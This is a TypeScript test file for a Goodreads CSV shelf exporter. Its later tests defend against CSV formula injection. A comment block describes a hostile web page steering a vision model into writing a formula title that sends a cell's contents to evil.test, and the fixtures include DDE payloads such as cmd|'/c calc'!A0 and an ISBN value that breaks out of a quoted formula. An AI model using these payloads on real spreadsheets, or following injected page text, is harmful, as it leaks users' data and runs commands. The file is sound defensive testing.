import { describe, it, expect } from 'vitest';
import { toGoodreadsCsv, shelfFilename } from './goodreadsCsv';
import type { SavedBook } from './storage';

/** Local noon, so the date reads 2026/08/13 in every timezone the tests might run in. */
const AUG_13 = new Date(2026, 7, 13, 12, 0, 0).getTime();

const saved = (over: Partial<SavedBook> = {}): SavedBook => ({
  id: 'a',
  book: { title: 'Ficciones', author: 'Jorge Luis Borges' },
  intent: 'next',
  savedAt: AUG_13,
  ...over,
});

/** The data rows, without the header. */
const rows = (books: SavedBook[]): string[] => toGoodreadsCsv(books).split('\n').slice(1);

describe('toGoodreadsCsv', () => {
  it('leads with the header both importers key off', () => {
    expect(toGoodreadsCsv([]).split('\n')[0]).toBe(
      'Title,Author,ISBN,Exclusive Shelf,Bookshelves,Date Added,My Review',
    );
  });

  it('is the header alone when the shelf is empty', () => {
    expect(toGoodreadsCsv([]).split('\n')).toHaveLength(1);
  });

  it.each([
    ['now', 'to-read', 'buki-now'],
    ['next', 'to-read', 'buki-next'],
    ['someday', 'to-read', 'buki-someday'],
    ['read', 'read', 'buki-read'],
  ] as const)('files %s as %s, keeping the pile as a tag', (intent, shelf, tag) => {
    // Now, Next and Someday are a PRIORITY, not a reading state: the shelf spec says
    // "priority inside a pile is the problem Now/Next/Someday already solves". So none
    // of them is `currently-reading`, which would tell Goodreads you are actively
    // reading forty books. The tag is what stops the collapse losing the ordering.
    const [row] = rows([saved({ intent })]);
    expect(row).toContain(`,${shelf},${tag},`);
  });

  it('quotes a title containing a comma', () => {
    const [row] = rows([saved({ book: { title: 'Cosmos, and other essays', author: 'Sagan' } })]);
    expect(row).toContain('"Cosmos, and other essays"');
  });

  it('doubles a quote inside a title', () => {
    const [row] = rows([saved({ book: { title: 'The "Good" Parts', author: 'Crockford' } })]);
    expect(row).toContain('"The ""Good"" Parts"');
  });

  it('wraps an ISBN the way Goodreads wraps its own, so Excel cannot eat it', () => {
    // A bare 13 digit ISBN opened in Excel becomes 9.78145E+12, and re-saving before
    // importing corrupts the file silently. Goodreads' OWN export uses this form, so
    // both importers demonstrably read it.
    const [row] = rows([saved({ book: { title: 'DDIA', author: 'Kleppmann', isbn: '9781449373320' } })]);
    expect(row).toContain('"=""9781449373320"""');
  });

  it('leaves the ISBN empty rather than inventing one', () => {
    const [row] = rows([saved()]);
    expect(row).toBe('Ficciones,Jorge Luis Borges,,to-read,buki-next,2026/08/13,');
  });

  it('keeps the post that sold you, which is the thing no competitor stores', () => {
    const [row] = rows([
      saved({ source: { url: 'https://x.com/u/status/1', kind: 'tweet' } }),
    ]);
    expect(row).toContain('Caught from https://x.com/u/status/1');
  });

  it('writes nothing into My Review when there is no source', () => {
    // Never a fabricated string in a field meant for the reader's own words.
    expect(rows([saved()])[0]?.endsWith(',')).toBe(true);
  });

  it('dates in Goodreads’ own format, from when the book was caught', () => {
    expect(rows([saved()])[0]).toContain(',2026/08/13,');
  });

  it('keeps shelf order, newest first, rather than resorting', () => {
    const older = saved({ id: 'b', book: { title: 'Older', author: 'A' } });
    const newer = saved({ id: 'c', book: { title: 'Newer', author: 'B' } });
    expect(rows([newer, older]).map((r) => r.split(',')[0])).toEqual(['Newer', 'Older']);
  });
});

/**
 * RFC 4180, enough to read back what `field()` wrote.
 *
 * The tests below have to assert what a SPREADSHEET sees, not what the file says. A cell
 * holding `=cmd|...` is written to disk as `"=cmd|..."`, and asserting on the raw row would
 * let a fix that merely adds CSV quoting look like a fix — quoting is stripped before the
 * cell is evaluated, so it defends nothing.
 */
function cells(row: string): string[] {
  const out: string[] = [];
  let cur = '';
  let quoted = false;
  for (let i = 0; i < row.length; i++) {
    const c = row[i];
    if (quoted) {
      if (c === '"' && row[i + 1] === '"') {
        cur += '"';
        i++;
      } else if (c === '"') quoted = false;
      else cur += c;
    } else if (c === '"' && cur === '') quoted = true;
    else if (c === ',') {
      out.push(cur);
      cur = '';
    } else cur += c;
  }
  out.push(cur);
  return out;
}

/**
 * PROMPT INJECTION, THEN CSV FORMULA INJECTION. `OPENWORK.md` item 46, TM-8.
 *
 * The title in a `SavedBook` is not the reader's words and it is not ours. It is what a
 * vision model read off a picture, and the picture came from a page Buki does not control —
 * a post on X, or any image the reader right-clicked. So the model's output is untrusted
 * input that has crossed a trust boundary, and this module writes it into a file format
 * that Excel, Sheets, LibreOffice and Numbers all EXECUTE when a cell begins `=`, `+`, `-`
 * or `@`.
 *
 * The chain is short and entirely plausible: a hostile page carries text steering the model
 * to answer with a title of `=HYPERLINK("http://evil.test?"&A2,"Open")`, the reader saves
 * the book, exports their shelf months later, opens the file to look at it before uploading
 * — which is exactly what `isbnCell` already assumes people do — and the cell next to it is
 * sent to a stranger on click.
 *
 * THE TRAP IN THE OBVIOUS FIX: `isbnCell` DELIBERATELY emits `="9781449373320"`, which
 * begins with `=` and is meant to. That is Goodreads' own export format and the reason a
 * bare ISBN does not become 9.78145E+12. A blanket "prefix every cell starting with `=`"
 * breaks it silently, and the test below is what catches that.
 */
describe('a title is never a formula', () => {
  it.each([
    ['=', '=HYPERLINK("http://evil.test?"&A2,"Your library")'],
    ['+', "+cmd|'/c calc'!A0"],
    ['-', "-1+cmd|'/c calc'!A0"],
    ['@', "@SUM(1+1)*cmd|'/c calc'!A0"],
    ['a tab', '\tSUM(1+1)'],
    ['a carriage return', '\r=SUM(1+1)'],
  ])('neutralises a title beginning with %s', (_lead, title) => {
    const [row] = rows([saved({ book: { title, author: 'Borges' } })]);
    // What the spreadsheet sees, after its own quoting is undone.
    expect(cells(row ?? '')[0]).toBe(`'${title}`);
  });

  it('neutralises an author too, because the model writes that field as well', () => {
    const [row] = rows([saved({ book: { title: 'Ficciones', author: '=1+1' } })]);
    expect(cells(row ?? '')[1]).toBe("'=1+1");
  });

  it('leaves an ordinary title exactly as the reader would write it', () => {
    // The apostrophe is a spreadsheet text marker and is not displayed, but it IS a
    // character, and the primary path for this file is UPLOAD to Goodreads rather than
    // Excel. Adding one to every title would corrupt every title on the honest path.
    const [row] = rows([saved({ book: { title: 'Ficciones', author: 'Jorge Luis Borges' } })]);
    expect(cells(row ?? '')[0]).toBe('Ficciones');
    expect(cells(row ?? '')[1]).toBe('Jorge Luis Borges');
  });

  it('STILL writes the ISBN as the formula Goodreads itself emits', () => {
    // The trap. A blanket escape breaks this and nothing else would notice: the ISBN would
    // import as the text `'="9781449373320"` and the book would arrive with no ISBN, which
    // is precisely the duplicate-on-reimport failure `isbnCell` exists to avoid.
    const [row] = rows([
      saved({ book: { title: 'DDIA', author: 'Kleppmann', isbn: '9781449373320' } }),
    ]);
    expect(cells(row ?? '')[2]).toBe('="9781449373320"');
  });

  it('refuses the formula form for an ISBN that is not one', () => {
    // A SECOND VECTOR, not in the review. `isbnCell` writes `="<isbn>"`, which IS a
    // formula, so a value carrying a quote breaks out of it: `="x"&cmd|'/c calc'!A0&""`
    // is a live DDE concatenation and CSV quoting does not touch it.
    //
    // The page cannot reach this — `extractIsbnFromLinks` validates to `[0-9X]{10}` — but
    // OPENLIBRARY CAN. `openLibrary.ts:44` takes `doc.isbn[0]` out of a JSON response and
    // casts it, and openlibrary.org is a WIKI: anyone may edit an edition record. So the
    // value is third-party input reaching a formula, which is the same class as AC-10 with
    // a worse sink.
    const hostile = '9781449373320"&cmd|\'/c calc\'!A0&"';
    const [row] = rows([saved({ book: { title: 'DDIA', author: 'K', isbn: hostile } })]);
    // Falls back to a plain text cell. Not the formula, and not silently dropped either:
    // the reader keeps whatever the catalogue said, they just do not execute it.
    expect(cells(row ?? '')[2]).toBe(hostile);
  });

  it('neutralises an ISBN that is itself a formula, rather than merely declining to wrap it', () => {
    // The half-fix: refuse the `="…"` form but write the value raw, and a catalogue value
    // of `=cmd|…` is a formula in its own right. Declining to wrap is not the same as
    // making safe.
    const [row] = rows([
      saved({ book: { title: 'DDIA', author: 'K', isbn: "=cmd|'/c calc'!A0" } }),
    ]);
    expect(cells(row ?? '')[2]).toBe("'=cmd|'/c calc'!A0");
  });

  it('still writes the formula form for a hyphenated ISBN, which OpenLibrary emits', () => {
    const [row] = rows([saved({ book: { title: 'DDIA', author: 'K', isbn: '978-1-4493-7332-0' } })]);
    expect(cells(row ?? '')[2]).toBe('="978-1-4493-7332-0"');
  });

  it('keeps the comma and quote handling that was already right', () => {
    const [row] = rows([
      saved({ book: { title: '=Cosmos, "and" others', author: 'Sagan' } }),
    ]);
    expect(cells(row ?? '')[0]).toBe('\'=Cosmos, "and" others');
  });
});

describe('shelfFilename', () => {
  it('names the file for the day it was taken', () => {
    expect(shelfFilename(AUG_13)).toBe('buki-shelf-2026-08-13.csv');
  });
});
